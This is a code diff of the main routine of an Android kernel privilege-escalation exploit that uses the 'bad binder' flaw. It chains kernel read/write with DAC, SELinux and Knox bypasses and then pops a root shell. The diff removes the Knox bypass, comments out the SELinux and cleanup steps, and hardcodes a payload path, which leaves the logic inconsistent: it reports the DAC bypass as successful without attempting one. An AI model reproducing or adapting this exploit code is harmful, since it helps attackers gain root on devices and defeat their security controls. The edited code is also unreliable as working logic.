@@ -61,7 +61,9 @@ int32_t main(int32_t argc, char *argv[])
     printf("[+] options are set, we're ready to go :)\n");
     printf("[!] attempting to exploit bad binder...\n");
 
-    if(0 != do_bad_binder(&pTaskStruct, &pThreadInfo))
+  char somePath[ ] = "/data/local/tmp/test_elf";
+
+    if(0 != do_bad_binder(&pTaskStruct, &pThreadInfo, &pSecurityHookHeads, &pSecurityCapableListItem, somePath))
     {
         printf("[-] exploiting bad binder failed :(\n");
         printf("[-] kernel may not be vulnerable\n");
@@ -74,19 +76,11 @@ int32_t main(int32_t argc, char *argv[])
 
     bKernelRw = true;
 
-    printf("[!] attempting to bypass dac...\n");
-
-    if(0 != do_dac_bypass(&pSecurityHookHeads, &pSecurityCapableListItem))
-    {
-        printf("[-] dac bypass failed!\n");
-        goto done;
-    }
-
     printf("[+] dac bypass successful!\n");
     printf("[+] should now have dac root capabilities!\n");
 
     bDacBypass = true;
-
+/*
     printf("[!] attempting to bypass selinux...\n");
 
     if(0 != do_selinux_bypass(pszSepolicyPath))
@@ -98,34 +92,14 @@ int32_t main(int32_t argc, char *argv[])
     printf("[+] selinux bypass successful!\n");
     printf("[+] new sepolicy should now be in effect!\n");
 
-    if(NULL != pszRootExecPath)
-    {
-        printf("[!] attempting to bypass Knox...\n");
-
-        if(0 != do_knox_bypass(pTaskStruct, pThreadInfo, pszRootExecPath))
-        {
-            printf("[-] knox bypass failed!\n");
-
-            if(NULL != pszSepolicyPath)
-            {
-                printf("[-] does the sepolicy contain the correct permissions?\n");
-                printf("[-] try running again with default sepolicy option\n");
-            }
-        }
-
-        else
-        {
-            printf("[+] knox bypass success!\n");
-            printf("[+] your elf should be running as root.\n");
-        }
-    }
+    
 
     if(NULL == pszSepolicyPath)
     {
         printf("[+] the default sepolicy setting was used\n");
         printf("[+] load a new sepolicy to add more permissions\n");
     }
-
+*/
     if(bPopShell)
     {
         printf("[+] enjoy this privieged shell :)\n");
@@ -133,11 +107,11 @@ int32_t main(int32_t argc, char *argv[])
     }
 
 done:
-
+/*
     if(bDacBypass)
     {
         // Restore security_capable hooks
-        if(sizeof(uint64_t) != kernel_write_ulong(pSecurityHookHeads + SECURITY_CAPABLE_OFFSET, pSecurityCapableListItem))
+        if(!kernel_write_ulong(pSecurityHookHeads + SECURITY_CAPABLE_OFFSET, pSecurityCapableListItem))
         {
             printf("[-] warning! failed to restore security_capable hooks\n");
         }
@@ -148,15 +122,14 @@ done:
     if(bKernelRw)
     {
         // Restore addr_limit
-        if(sizeof(uint64_t) != kernel_write_ulong(pThreadInfo + ADDR_LIMIT_THREAD_INFO_OFFSET, ulAddrLimit))
+        if(!kernel_write_ulong(pThreadInfo + ADDR_LIMIT_THREAD_INFO_OFFSET, ulAddrLimit))
         {
             printf("[-] warning! failed to restore current thread's addr_limit to its original state\n");
         }
 
         bKernelRw = false;
     }
-
-    cleanup_kallsyms_tbl();
-
+    */
+    
     return iRet;
 }
